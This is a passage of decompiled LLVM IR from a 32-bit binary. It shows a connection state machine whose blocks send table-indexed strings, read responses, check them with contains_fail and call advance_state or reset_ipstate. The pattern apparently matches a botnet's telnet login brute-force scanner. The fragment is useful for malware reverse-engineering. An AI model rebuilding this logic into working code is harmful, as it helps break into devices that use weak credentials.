  store i32 %v1_8052320, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052d64

dec_label_pc_805232d:                             ; preds = %dec_label_pc_80522c8
  store i32 %v2_8051fca, i32* %eax.global-to-local, align 4
  %v4_8052336 = load i32, i32* %v3_805225c, align 16
  store i32 %v4_8052336, i32* %eax.global-to-local, align 4
  %v1_805233c = add i32 %v0_8052303, 24
  %v2_805233c = inttoptr i32 %v1_805233c to i32*
  store i32 0, i32* %v2_805233c, align 4
  %v1_805233e = add i32 %v0_8052303, 20
  %v2_805233e = inttoptr i32 %v1_805233e to i32*
  store i32 3, i32* %v2_805233e, align 4
  %v0_8052340 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052340 = add i32 %v0_8052303, 16
  %v3_8052340 = inttoptr i32 %v2_8052340 to i32*
  store i32 %v0_8052340, i32* %v3_8052340, align 4
  %v0_8052341 = load i32, i32* %stack_var_-336, align 4
  %v1_8052341 = load i32, i32* %stack_var_-332, align 4
  %v2_8052341 = load i32, i32* %stack_var_-328, align 4
  %v3_8052341 = call i32 @fcntl(i32 %v0_8052341, i32 %v1_8052341, i32 %v2_8052341)
  %v0_8052346 = load i32, i32* @esp, align 4
  %v13_805234b = and i32 %v3_8052341, -2049
  store i32 %v13_805234b, i32* @ecx, align 4
  store i32 %v2_8051f36, i32* %edx.global-to-local, align 4
  store i32 %v2_8051fca, i32* %eax.global-to-local, align 4
  %v4_8052357 = load i32, i32* %v3_805225c, align 16
  store i32 %v4_8052357, i32* %eax.global-to-local, align 4
  %v2_805235d = add i32 %v0_8052346, 8
  %v3_805235d = inttoptr i32 %v2_805235d to i32*
  store i32 %v13_805234b, i32* %v3_805235d, align 4
  %v1_805235e = add i32 %v0_8052346, 4
  %v2_805235e = inttoptr i32 %v1_805235e to i32*
  store i32 4, i32* %v2_805235e, align 4
  %v0_8052360 = load i32, i32* %eax.global-to-local, align 4
  %v3_8052360 = inttoptr i32 %v0_8052346 to i32*
  store i32 %v0_8052360, i32* %v3_8052360, align 4
  %v0_8052361 = load i32, i32* %stack_var_-336, align 4
  %v1_8052361 = load i32, i32* %stack_var_-332, align 4
  %v2_8052361 = load i32, i32* %stack_var_-328, align 4
  %v3_8052361 = call i32 @fcntl(i32 %v0_8052361, i32 %v1_8052361, i32 %v2_8052361)
  %v0_8052366 = load i32, i32* @esp, align 4
  store i32 %v2_8051f36, i32* @edx, align 4
  store i32 %v2_8051fcd, i32* %eax.global-to-local, align 4
  %v1_8052378 = add i32 %v0_8052366, 4
  %v2_8052378 = inttoptr i32 %v1_8052378 to i32*
  store i32 2, i32* %v2_8052378, align 4
  %v0_805237a = load i32, i32* %eax.global-to-local, align 4
  %v3_805237a = inttoptr i32 %v0_8052366 to i32*
  store i32 %v0_805237a, i32* %v3_805237a, align 4
  %v0_805237b = load i32, i32* %stack_var_-336, align 4
  %v1_805237b = load i32, i32* %stack_var_-332, align 4
  %v2_805237b = inttoptr i32 %v0_805237b to i32*
  %v3_805237b = call i32 @advance_state(i32* %v2_805237b, i32 %v1_805237b)
  store i32 %v3_805237b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052d64

dec_label_pc_8052388:                             ; preds = %dec_label_pc_805223a
  %v13_8052388 = icmp eq i32 %v5_80522b3, -1
  %v1_805238c = icmp eq i1 %v13_8052388, false
  store i32 %v2_8051f36, i32* @edx, align 4
  br i1 %v1_805238c, label %dec_label_pc_80523ab, label %dec_label_pc_805238e

dec_label_pc_805238e:                             ; preds = %dec_label_pc_8052388
  store i32 %v2_8051fcd, i32* %eax.global-to-local, align 4
  %v2_805239d = add i32 %v0_80522b8, 16
  %v3_805239d = inttoptr i32 %v2_805239d to i32*
  store i32 %v2_8051fcd, i32* %v3_805239d, align 4
  %v1_805239e = call i32 @reset_ipstate(i32 %v5_80522b3)
  store i32 %v1_805239e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052d64

dec_label_pc_80523ab:                             ; preds = %dec_label_pc_8052388
  store i32 %v1_8051fcf, i32* %eax.global-to-local, align 4
  %v2_80523b9 = load i32, i32* %v1_8051fd2, align 16
  store i32 %v2_80523b9, i32* %eax.global-to-local, align 4
  %v1_80523bb = add i32 %v2_80523b9, 6
  store i32 %v1_80523bb, i32* @ebx, align 4
  %v1_80523c1 = add i32 %v0_80522b8, 16
  %v2_80523c1 = inttoptr i32 %v1_80523c1 to i32*
  store i32 0, i32* %v2_80523c1, align 4
  %v1_80523c3 = inttoptr i32 %v5_80522b3 to i32*
  %v2_80523c3 = call i32 @__GI_time(i32* %v1_80523c3)
  store i32 %v2_80523c3, i32* %eax.global-to-local, align 4
  %v0_80523cb = load i32, i32* @ebx, align 4
  %v7_80523cb = icmp ult i32 %v0_80523cb, %v2_80523c3
  %v1_80523cd = icmp eq i1 %v7_80523cb, false
  br i1 %v1_80523cd, label %dec_label_pc_8052d64, label %dec_label_pc_80523d3

dec_label_pc_80523d3:                             ; preds = %dec_label_pc_80523ab
  %v0_80523c8 = load i32, i32* @esp, align 4
  store i32 %v2_8051f36, i32* @edx, align 4
  store i32 %v2_8051fcd, i32* %eax.global-to-local, align 4
  %v3_80523e2 = inttoptr i32 %v0_80523c8 to i32*
  store i32 %v2_8051fcd, i32* %v3_80523e2, align 4
  %v0_80523e3 = load i32, i32* %stack_var_-336, align 4
  %v1_80523e3 = call i32 @reset_ipstate(i32 %v0_80523e3)
  store i32 %v1_80523e3, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052d64

dec_label_pc_80523f0:                             ; preds = %dec_label_pc_8051ff9
  store i32 %v2_8051f36, i32* %edx.global-to-local, align 4
  %v1_80523fb = add i32 %v2_8051fcd, 28
  store i32 %v1_80523fb, i32* %eax.global-to-local, align 4
  %v1_80523fe = inttoptr i32 %v1_80523fb to i32*
  %v2_80523fe = load i32, i32* %v1_80523fe, align 4
  store i32 %v2_80523fe, i32* %ecx.global-to-local, align 4
  store i32 %v2_8051f36, i32* %edx.global-to-local, align 4
  store i32 %v2_8051fca, i32* %eax.global-to-local, align 4
  %v3_8052409 = inttoptr i32 %v2_8051fcd to i32*
  %v4_8052409 = load i32, i32* %v3_8052409, align 16
  store i32 %v4_8052409, i32* %eax.global-to-local, align 4
  %v0_805240c = load i32, i32* @esp, align 4
  %v1_805240f = add i32 %v0_805240c, -16
  %v2_805240f = inttoptr i32 %v1_805240f to i32*
  store i32 134676144, i32* %v2_805240f, align 4
  %v1_8052414 = add i32 %v0_805240c, -20
  %v2_8052414 = inttoptr i32 %v1_8052414 to i32*
  store i32 1024, i32* %v2_8052414, align 4
  %v0_8052419 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8052419 = add i32 %v0_805240c, -24
  %v3_8052419 = inttoptr i32 %v2_8052419 to i32*
  store i32 %v0_8052419, i32* %v3_8052419, align 4
  %v5_805241a = add i32 %v0_805240c, -28
  %v6_805241a = inttoptr i32 %v5_805241a to i32*
  store i32 %arg1, i32* %v6_805241a, align 4
  %v0_805241d = load i32, i32* %eax.global-to-local, align 4
  %v2_805241d = add i32 %v0_805240c, -32
  %v3_805241d = inttoptr i32 %v2_805241d to i32*
  store i32 %v0_805241d, i32* %v3_805241d, align 4
  %v1_805241e = call i32 @read_until_response(i32 %v6_8052002)
  %v0_8052423 = load i32, i32* @esp, align 4
  %v1_8052426 = icmp eq i32 %v1_805241e, 0
  store i32 %v2_8051f36, i32* @edx, align 4
  store i32 %v2_8051fcd, i32* %eax.global-to-local, align 4
  br i1 %v1_8052426, label %dec_label_pc_8052488, label %dec_label_pc_805242a

dec_label_pc_805242a:                             ; preds = %dec_label_pc_80523f0
  store i32 %v1_80523fb, i32* %eax.global-to-local, align 4
  %v2_8052438 = load i32, i32* %v1_80523fe, align 4
  store i32 %v2_8052438, i32* %eax.global-to-local, align 4
  %v2_805243d = add i32 %v0_8052423, 16
  %v3_805243d = inttoptr i32 %v2_805243d to i32*
  store i32 %v2_8052438, i32* %v3_805243d, align 4
  %v0_805243e = load i32, i32* %stack_var_-336, align 4
  %v1_805243e = call i32 @contains_fail(i32 %v0_805243e)
  %v0_8052443 = load i32, i32* @esp, align 4
  %v1_8052446 = icmp eq i32 %v1_805243e, 0
  store i32 %v2_8051f36, i32* @edx, align 4
  store i32 %v2_8051fcd, i32* %eax.global-to-local, align 4
  %v1_8052478 = add i32 %v0_8052443, 4
  %v2_8052478 = inttoptr i32 %v1_8052478 to i32*
  br i1 %v1_8052446, label %dec_label_pc_8052469, label %dec_label_pc_805244a

dec_label_pc_805244a:                             ; preds = %dec_label_pc_805242a
  store i32 0, i32* %v2_8052478, align 4
  %v0_805245b = load i32, i32* %eax.global-to-local, align 4
  %v3_805245b = inttoptr i32 %v0_8052443 to i32*
  store i32 %v0_805245b, i32* %v3_805245b, align 4
  %v0_805245c = load i32, i32* %stack_var_-336, align 4
  %v1_805245c = load i32, i32* %stack_var_-332, align 4
  %v2_805245c = inttoptr i32 %v0_805245c to i32*
  %v3_805245c = call i32 @advance_state(i32* %v2_805245c, i32 %v1_805245c)
  store i32 %v3_805245c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052d64

dec_label_pc_8052469:                             ; preds = %dec_label_pc_805242a
  store i32 3, i32* %v2_8052478, align 4
  %v0_805247a = load i32, i32* %eax.global-to-local, align 4
  %v3_805247a = inttoptr i32 %v0_8052443 to i32*
  store i32 %v0_805247a, i32* %v3_805247a, align 4
  %v0_805247b = load i32, i32* %stack_var_-336, align 4
  %v1_805247b = load i32, i32* %stack_var_-332, align 4
  %v2_805247b = inttoptr i32 %v0_805247b to i32*
  %v3_805247b = call i32 @advance_state(i32* %v2_805247b, i32 %v1_805247b)
  store i32 %v3_805247b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052d64

dec_label_pc_8052488:                             ; preds = %dec_label_pc_80523f0
  store i32 %v1_8051fcf, i32* %eax.global-to-local, align 4
  %v2_8052496 = load i32, i32* %v1_8051fd2, align 16
  store i32 %v2_8052496, i32* %eax.global-to-local, align 4
  %v1_8052498 = add i32 %v2_8052496, 6
  store i32 %v1_8052498, i32* @ebx, align 4
  %v1_805249e = add i32 %v0_8052423, 16
  %v2_805249e = inttoptr i32 %v1_805249e to i32*
  store i32 0, i32* %v2_805249e, align 4
  %v0_80524a0 = load i32, i32* %stack_var_-336, align 4
  %v1_80524a0 = inttoptr i32 %v0_80524a0 to i32*
  %v2_80524a0 = call i32 @__GI_time(i32* %v1_80524a0)
  store i32 %v2_80524a0, i32* %eax.global-to-local, align 4
  %v0_80524a8 = load i32, i32* @ebx, align 4
  %v7_80524a8 = icmp ult i32 %v0_80524a8, %v2_80524a0
  %v1_80524aa = icmp eq i1 %v7_80524a8, false
  br i1 %v1_80524aa, label %dec_label_pc_8052d64, label %dec_label_pc_80524b0

dec_label_pc_80524b0:                             ; preds = %dec_label_pc_8052488
  %v0_80524a5 = load i32, i32* @esp, align 4
  store i32 %v2_8051f36, i32* @edx, align 4
  store i32 %v2_8051fcd, i32* %eax.global-to-local, align 4
  %v3_80524bf = inttoptr i32 %v0_80524a5 to i32*
  store i32 %v2_8051fcd, i32* %v3_80524bf, align 4
  %v0_80524c0 = load i32, i32* %stack_var_-336, align 4
  %v1_80524c0 = call i32 @reset_ipstate(i32 %v0_80524c0)
  store i32 %v1_80524c0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052d64

dec_label_pc_80524cd:                             ; preds = %dec_label_pc_8051ff9
  store i32 %v2_8051f36, i32* %edx.global-to-local, align 4
  store i32 %v2_8051fca, i32* %eax.global-to-local, align 4
  %v2_80524d6 = or i32 %v2_8051fca, 10
  %v3_80524d6 = add i32 %v2_80524d6, %v2_8051f36
  %v4_80524d6 = inttoptr i32 %v3_80524d6 to i8*
  %v5_80524d6 = load i8, i8* %v4_80524d6, align 2
  %v6_80524d6 = zext i8 %v5_80524d6 to i32
  store i32 %v6_80524d6, i32* %eax.global-to-local, align 4
  %v1_80524df = mul nuw nsw i32 %v6_80524d6, 4
  %v2_80524df = add nuw nsw i32 %v1_80524df, 134675328
  %v3_80524df = inttoptr i32 %v2_80524df to i32*
  %v4_80524df = load i32, i32* %v3_80524df, align 4
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v1_80524f1 = and i32 %v4_80524df, -256
  store i32 %v1_80524f1, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v4_80524f4 = inttoptr i32 %v4_80524df to i8*
  store i32 %v4_80524df, i32* @edi, align 4
  %v3_80524fa = call i32 @_strlen(i8* %v4_80524f4)
  %v4_80524fa = mul i32 %v3_80524fa, -1
  %v5_80524fa = add i32 %v4_80524fa, -2
  store i32 %v5_80524fa, i32* %ecx.global-to-local, align 4
  %v1_8052500 = sub i32 0, %v4_80524fa
  store i32 %v1_8052500, i32* @ebx, align 4
  store i32 %v2_8051f36, i32* %edx.global-to-local, align 4
  store i32 %v2_8051fca, i32* %eax.global-to-local, align 4
  %v5_805250c = load i8, i8* %v4_80524d6, align 2
  %v6_805250c = zext i8 %v5_805250c to i32
  store i32 %v6_805250c, i32* %eax.global-to-local, align 4
  %v1_8052515 = mul nuw nsw i32 %v6_805250c, 4
  %v2_8052515 = add nuw nsw i32 %v1_8052515, 134675328
  %v3_8052515 = inttoptr i32 %v2_8052515 to i32*
  %v4_8052515 = load i32, i32* %v3_8052515, align 4
  store i32 %v4_8052515, i32* @ecx, align 4
  store i32 %v2_8051f36, i32* %edx.global-to-local, align 4
  store i32 %v2_8051fca, i32* %eax.global-to-local, align 4
  %v3_8052525 = inttoptr i32 %v2_8051fcd to i32*
  %v4_8052525 = load i32, i32* %v3_8052525, align 16
  store i32 %v4_8052525, i32* %eax.global-to-local, align 4
  %v0_8052528 = load i32, i32* @esp, align 4
  %v1_8052528 = add i32 %v0_8052528, -4
  %v2_8052528 = inttoptr i32 %v1_8052528 to i32*
  store i32 16384, i32* %v2_8052528, align 4
  %v0_805252d = load i32, i32* @ebx, align 4
  %v2_805252d = add i32 %v0_8052528, -8
  %v3_805252d = inttoptr i32 %v2_805252d to i32*
  store i32 %v0_805252d, i32* %v3_805252d, align 4
  %v0_805252e = load i32, i32* @ecx, align 4
  %v2_805252e = add i32 %v0_8052528, -12
  %v3_805252e = inttoptr i32 %v2_805252e to i32*
  store i32 %v0_805252e, i32* %v3_805252e, align 4
  %v0_805252f = load i32, i32* %eax.global-to-local, align 4
  %v2_805252f = add i32 %v0_8052528, -16
  %v3_805252f = inttoptr i32 %v2_805252f to i32*
  store i32 %v0_805252f, i32* %v3_805252f, align 4
  %v4_8052530 = call i32 @send(i32 %v4_80524df, i32 %v2_8051f36, i32 %v6_8052002, i32 %v15_8051e38)
  store i32 %v4_8052530, i32* %eax.global-to-local, align 4
  %v0_8052535 = load i32, i32* @esp, align 4
  %v2_8052538 = icmp slt i32 %v4_8052530, 0
  %v1_805253a = icmp eq i1 %v2_8052538, false
  store i32 %v2_8051f36, i32* @edx, align 4
  br i1 %v1_805253a, label %dec_label_pc_8052559, label %dec_label_pc_805253c

dec_label_pc_805253c:                             ; preds = %dec_label_pc_80524cd
  store i32 %v2_8051fcd, i32* %eax.global-to-local, align 4
  %v3_805254b = inttoptr i32 %v0_8052535 to i32*
  store i32 %v2_8051fcd, i32* %v3_805254b, align 4
  %v1_805254c = call i32 @reset_ipstate(i32 %v4_80524df)
  store i32 %v1_805254c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052d64

dec_label_pc_8052559:                             ; preds = %dec_label_pc_80524cd
  store i32 %v2_8051fca, i32* %eax.global-to-local, align 4
  %v4_8052562 = load i32, i32* %v3_8052525, align 16
  store i32 %v4_8052562, i32* %eax.global-to-local, align 4
  %v1_8052565 = add i32 %v0_8052535, 12
  %v2_8052565 = inttoptr i32 %v1_8052565 to i32*
  store i32 16384, i32* %v2_8052565, align 4
  %v1_805256a = add i32 %v0_8052535, 8
  %v2_805256a = inttoptr i32 %v1_805256a to i32*
  store i32 2, i32* %v2_805256a, align 4
  %v1_805256c = add i32 %v0_8052535, 4
  %v2_805256c = inttoptr i32 %v1_805256c to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_806a393.325 to i32), i32* %v2_805256c, align 4
  %v0_8052571 = load i32, i32* %eax.global-to-local, align 4
  %v3_8052571 = inttoptr i32 %v0_8052535 to i32*
  store i32 %v0_8052571, i32* %v3_8052571, align 4
  %v4_8052572 = call i32 @send(i32 %v4_80524df, i32 %v2_8051f36, i32 %v6_8052002, i32 %v15_8051e38)
  %v0_8052577 = load i32, i32* @esp, align 4
  %v2_805257a = icmp slt i32 %v4_8052572, 0
  %v1_805257c = icmp eq i1 %v2_805257a, false
  store i32 %v2_8051f36, i32* @edx, align 4
  store i32 %v2_8051fcd, i32* %eax.global-to-local, align 4
  br i1 %v1_805257c, label %dec_label_pc_805259b, label %dec_label_pc_805257e

dec_label_pc_805257e:                             ; preds = %dec_label_pc_8052559
  %v3_805258d = inttoptr i32 %v0_8052577 to i32*
  store i32 %v2_8051fcd, i32* %v3_805258d, align 4
  %v1_805258e = call i32 @reset_ipstate(i32 %v4_80524df)
  store i32 %v1_805258e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052d64

dec_label_pc_805259b:                             ; preds = %dec_label_pc_8052559
  %v1_80525aa = add i32 %v0_8052577, 4
  %v2_80525aa = inttoptr i32 %v1_80525aa to i32*
  store i32 4, i32* %v2_80525aa, align 4
  %v0_80525ac = load i32, i32* %eax.global-to-local, align 4
  %v3_80525ac = inttoptr i32 %v0_8052577 to i32*
  store i32 %v0_80525ac, i32* %v3_80525ac, align 4
  %v2_80525ad = inttoptr i32 %v4_80524df to i32*
  %v3_80525ad = call i32 @advance_state(i32* %v2_80525ad, i32 %v2_8051f36)
  store i32 %v3_80525ad, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052d64

dec_label_pc_80525ba:                             ; preds = %dec_label_pc_8051ff9
  store i32 %v2_8051f36, i32* %edx.global-to-local, align 4
  %v1_80525c5 = add i32 %v2_8051fcd, 28
  store i32 %v1_80525c5, i32* %eax.global-to-local, align 4
  %v1_80525c8 = inttoptr i32 %v1_80525c5 to i32*
  %v2_80525c8 = load i32, i32* %v1_80525c8, align 4
  store i32 %v2_80525c8, i32* %ecx.global-to-local, align 4
  store i32 %v2_8051f36, i32* %edx.global-to-local, align 4
  store i32 %v2_8051fca, i32* %eax.global-to-local, align 4
  %v3_80525d3 = inttoptr i32 %v2_8051fcd to i32*
  %v4_80525d3 = load i32, i32* %v3_80525d3, align 16
  store i32 %v4_80525d3, i32* %eax.global-to-local, align 4
  %v0_80525d6 = load i32, i32* @esp, align 4
  %v1_80525d9 = add i32 %v0_80525d6, -16
  %v2_80525d9 = inttoptr i32 %v1_80525d9 to i32*
  store i32 ptrtoint (i32* @global_var_806feb0 to i32), i32* %v2_80525d9, align 4
  %v1_80525de = add i32 %v0_80525d6, -20
  %v2_80525de = inttoptr i32 %v1_80525de to i32*
  store i32 1024, i32* %v2_80525de, align 4
  %v0_80525e3 = load i32, i32* %ecx.global-to-local, align 4
  %v2_80525e3 = add i32 %v0_80525d6, -24
  %v3_80525e3 = inttoptr i32 %v2_80525e3 to i32*
  store i32 %v0_80525e3, i32* %v3_80525e3, align 4
  %v5_80525e4 = add i32 %v0_80525d6, -28
  %v6_80525e4 = inttoptr i32 %v5_80525e4 to i32*
  store i32 %arg1, i32* %v6_80525e4, align 4
  %v0_80525e7 = load i32, i32* %eax.global-to-local, align 4
  %v2_80525e7 = add i32 %v0_80525d6, -32
  %v3_80525e7 = inttoptr i32 %v2_80525e7 to i32*
  store i32 %v0_80525e7, i32* %v3_80525e7, align 4
  %v1_80525e8 = call i32 @read_until_response(i32 %v6_8052002)
  %v0_80525ed = load i32, i32* @esp, align 4
  %v1_80525f0 = icmp eq i32 %v1_80525e8, 0
  store i32 %v2_8051f36, i32* @edx, align 4
  store i32 %v2_8051fcd, i32* %eax.global-to-local, align 4
  br i1 %v1_80525f0, label %dec_label_pc_8052652, label %dec_label_pc_80525f4

dec_label_pc_80525f4:                             ; preds = %dec_label_pc_80525ba
  store i32 %v1_80525c5, i32* %eax.global-to-local, align 4
  %v2_8052602 = load i32, i32* %v1_80525c8, align 4
  store i32 %v2_8052602, i32* %eax.global-to-local, align 4
  %v2_8052607 = add i32 %v0_80525ed, 16
  %v3_8052607 = inttoptr i32 %v2_8052607 to i32*
  store i32 %v2_8052602, i32* %v3_8052607, align 4
  %v1_8052608 = call i32 @contains_fail(i32 %stack_var_-624.289)
  %v0_805260d = load i32, i32* @esp, align 4
  %v1_8052610 = icmp eq i32 %v1_8052608, 0
  store i32 %v2_8051f36, i32* @edx, align 4
  store i32 %v2_8051fcd, i32* %eax.global-to-local, align 4
  %v1_8052642 = add i32 %v0_805260d, 4
  %v2_8052642 = inttoptr i32 %v1_8052642 to i32*
  br i1 %v1_8052610, label %dec_label_pc_8052633, label %dec_label_pc_8052614

dec_label_pc_8052614:                             ; preds = %dec_label_pc_80525f4
  store i32 0, i32* %v2_8052642, align 4
  %v0_8052625 = load i32, i32* %eax.global-to-local, align 4
  %v3_8052625 = inttoptr i32 %v0_805260d to i32*
  store i32 %v0_8052625, i32* %v3_8052625, align 4
  %v2_8052626 = inttoptr i32 %stack_var_-624.289 to i32*
  %v3_8052626 = call i32 @advance_state(i32* %v2_8052626, i32 %v2_8051f36)
  store i32 %v3_8052626, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052d64

dec_label_pc_8052633:                             ; preds = %dec_label_pc_80525f4
  store i32 5, i32* %v2_8052642, align 4
  %v0_8052644 = load i32, i32* %eax.global-to-local, align 4
  %v3_8052644 = inttoptr i32 %v0_805260d to i32*
  store i32 %v0_8052644, i32* %v3_8052644, align 4
  %v2_8052645 = inttoptr i32 %stack_var_-624.289 to i32*
  %v3_8052645 = call i32 @advance_state(i32* %v2_8052645, i32 %v2_8051f36)
  store i32 %v3_8052645, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052d64

dec_label_pc_8052652:                             ; preds = %dec_label_pc_80525ba
  store i32 %v1_8051fcf, i32* %eax.global-to-local, align 4
  %v2_8052660 = load i32, i32* %v1_8051fd2, align 16
  store i32 %v2_8052660, i32* %eax.global-to-local, align 4
  %v1_8052662 = add i32 %v2_8052660, 6
  store i32 %v1_8052662, i32* @ebx, align 4
  %v1_8052668 = add i32 %v0_80525ed, 16
  %v2_8052668 = inttoptr i32 %v1_8052668 to i32*
  store i32 0, i32* %v2_8052668, align 4
  %v1_805266a = inttoptr i32 %stack_var_-624.289 to i32*
  %v2_805266a = call i32 @__GI_time(i32* %v1_805266a)
  store i32 %v2_805266a, i32* %eax.global-to-local, align 4
  %v0_8052672 = load i32, i32* @ebx, align 4
  %v7_8052672 = icmp ult i32 %v0_8052672, %v2_805266a
  %v1_8052674 = icmp eq i1 %v7_8052672, false
  br i1 %v1_8052674, label %dec_label_pc_8052d64, label %dec_label_pc_805267a

dec_label_pc_805267a:                             ; preds = %dec_label_pc_8052652
  %v0_805266f = load i32, i32* @esp, align 4
  store i32 %v2_8051f36, i32* @edx, align 4
  store i32 %v2_8051fcd, i32* %eax.global-to-local, align 4
  %v3_8052689 = inttoptr i32 %v0_805266f to i32*
  store i32 %v2_8051fcd, i32* %v3_8052689, align 4
  %v1_805268a = call i32 @reset_ipstate(i32 %stack_var_-624.289)
  store i32 %v1_805268a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052d64

dec_label_pc_8052697:                             ; preds = %dec_label_pc_8051ff9
  store i32 %v2_8051f36, i32* %edx.global-to-local, align 4
  store i32 %v2_8051fca, i32* %eax.global-to-local, align 4
  %v2_80526a0 = or i32 %v2_8051fca, 11
  %v3_80526a0 = add i32 %v2_80526a0, %v2_8051f36
  %v4_80526a0 = inttoptr i32 %v3_80526a0 to i8*
  %v5_80526a0 = load i8, i8* %v4_80526a0, align 1
  %v6_80526a0 = zext i8 %v5_80526a0 to i32
  store i32 %v6_80526a0, i32* %eax.global-to-local, align 4
  %v1_80526a9 = mul nuw nsw i32 %v6_80526a0, 4
  %v2_80526a9 = add nuw nsw i32 %v1_80526a9, 134675744
  %v3_80526a9 = inttoptr i32 %v2_80526a9 to i32*
  %v4_80526a9 = load i32, i32* %v3_80526a9, align 4
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v1_80526bb = and i32 %v4_80526a9, -256
  store i32 %v1_80526bb, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v4_80526be = inttoptr i32 %v4_80526a9 to i8*
  store i32 %v4_80526a9, i32* @edi, align 4
  %v3_80526c4 = call i32 @_strlen(i8* %v4_80526be)
  %v4_80526c4 = mul i32 %v3_80526c4, -1
  %v5_80526c4 = add i32 %v4_80526c4, -2
  store i32 %v5_80526c4, i32* %ecx.global-to-local, align 4
  %v1_80526ca = sub i32 0, %v4_80526c4
  store i32 %v1_80526ca, i32* @ebx, align 4
  store i32 %v2_8051f36, i32* %edx.global-to-local, align 4
  store i32 %v2_8051fca, i32* %eax.global-to-local, align 4
  %v5_80526d6 = load i8, i8* %v4_80526a0, align 1
  %v6_80526d6 = zext i8 %v5_80526d6 to i32
  store i32 %v6_80526d6, i32* %eax.global-to-local, align 4
  %v1_80526df = mul nuw nsw i32 %v6_80526d6, 4
  %v2_80526df = add nuw nsw i32 %v1_80526df, 134675744
  %v3_80526df = inttoptr i32 %v2_80526df to i32*
  %v4_80526df = load i32, i32* %v3_80526df, align 4
  store i32 %v4_80526df, i32* @ecx, align 4
  store i32 %v2_8051f36, i32* %edx.global-to-local, align 4
  store i32 %v2_8051fca, i32* %eax.global-to-local, align 4
  %v3_80526ef = inttoptr i32 %v2_8051fcd to i32*
  %v4_80526ef = load i32, i32* %v3_80526ef, align 16
  store i32 %v4_80526ef, i32* %eax.global-to-local, align 4
  %v0_80526f2 = load i32, i32* @esp, align 4
  %v1_80526f2 = add i32 %v0_80526f2, -4
  %v2_80526f2 = inttoptr i32 %v1_80526f2 to i32*
  store i32 16384, i32* %v2_80526f2, align 4
  %v0_80526f7 = load i32, i32* @ebx, align 4
  %v2_80526f7 = add i32 %v0_80526f2, -8
  %v3_80526f7 = inttoptr i32 %v2_80526f7 to i32*
  store i32 %v0_80526f7, i32* %v3_80526f7, align 4
  %v0_80526f8 = load i32, i32* @ecx, align 4
  %v2_80526f8 = add i32 %v0_80526f2, -12
  %v3_80526f8 = inttoptr i32 %v2_80526f8 to i32*
  store i32 %v0_80526f8, i32* %v3_80526f8, align 4
  %v0_80526f9 = load i32, i32* %eax.global-to-local, align 4
  %v2_80526f9 = add i32 %v0_80526f2, -16
  %v3_80526f9 = inttoptr i32 %v2_80526f9 to i32*
  store i32 %v0_80526f9, i32* %v3_80526f9, align 4
  %v4_80526fa = call i32 @send(i32 %v4_80526a9, i32 %stack_var_-624.289, i32 %v2_8051f36, i32 %v6_8052002)
  store i32 %v4_80526fa, i32* %eax.global-to-local, align 4
  %v0_80526ff = load i32, i32* @esp, align 4
  %v2_8052702 = icmp slt i32 %v4_80526fa, 0
  %v1_8052704 = icmp eq i1 %v2_8052702, false
  store i32 %v2_8051f36, i32* @edx, align 4
  br i1 %v1_8052704, label %dec_label_pc_8052723, label %dec_label_pc_8052706

dec_label_pc_8052706:                             ; preds = %dec_label_pc_8052697
  store i32 %v2_8051fcd, i32* %eax.global-to-local, align 4
  %v3_8052715 = inttoptr i32 %v0_80526ff to i32*
  store i32 %v2_8051fcd, i32* %v3_8052715, align 4
  %v1_8052716 = call i32 @reset_ipstate(i32 %v4_80526a9)
  store i32 %v1_8052716, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052d64

dec_label_pc_8052723:                             ; preds = %dec_label_pc_8052697
  store i32 %v2_8051fca, i32* %eax.global-to-local, align 4
  %v4_805272c = load i32, i32* %v3_80526ef, align 16
  store i32 %v4_805272c, i32* %eax.global-to-local, align 4
  %v1_805272f = add i32 %v0_80526ff, 12
  %v2_805272f = inttoptr i32 %v1_805272f to i32*
  store i32 16384, i32* %v2_805272f, align 4
  %v1_8052734 = add i32 %v0_80526ff, 8
  %v2_8052734 = inttoptr i32 %v1_8052734 to i32*
  store i32 2, i32* %v2_8052734, align 4
  %v1_8052736 = add i32 %v0_80526ff, 4
  %v2_8052736 = inttoptr i32 %v1_8052736 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_806a393.325 to i32), i32* %v2_8052736, align 4
  %v0_805273b = load i32, i32* %eax.global-to-local, align 4
  %v3_805273b = inttoptr i32 %v0_80526ff to i32*
  store i32 %v0_805273b, i32* %v3_805273b, align 4
  %v4_805273c = call i32 @send(i32 %v4_80526a9, i32 %stack_var_-624.289, i32 %v2_8051f36, i32 %v6_8052002)
  %v0_8052741 = load i32, i32* @esp, align 4
  %v2_8052744 = icmp slt i32 %v4_805273c, 0
  %v1_8052746 = icmp eq i1 %v2_8052744, false
  store i32 %v2_8051f36, i32* @edx, align 4
  store i32 %v2_8051fcd, i32* %eax.global-to-local, align 4
  br i1 %v1_8052746, label %dec_label_pc_8052765, label %dec_label_pc_8052748

dec_label_pc_8052748:                             ; preds = %dec_label_pc_8052723
  %v3_8052757 = inttoptr i32 %v0_8052741 to i32*
  store i32 %v2_8051fcd, i32* %v3_8052757, align 4
  %v1_8052758 = call i32 @reset_ipstate(i32 %v4_80526a9)
  store i32 %v1_8052758, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052d64

dec_label_pc_8052765:                             ; preds = %dec_label_pc_8052723
  %v1_8052774 = add i32 %v0_8052741, 4
  %v2_8052774 = inttoptr i32 %v1_8052774 to i32*
  store i32 6, i32* %v2_8052774, align 4
  %v0_8052776 = load i32, i32* %eax.global-to-local, align 4
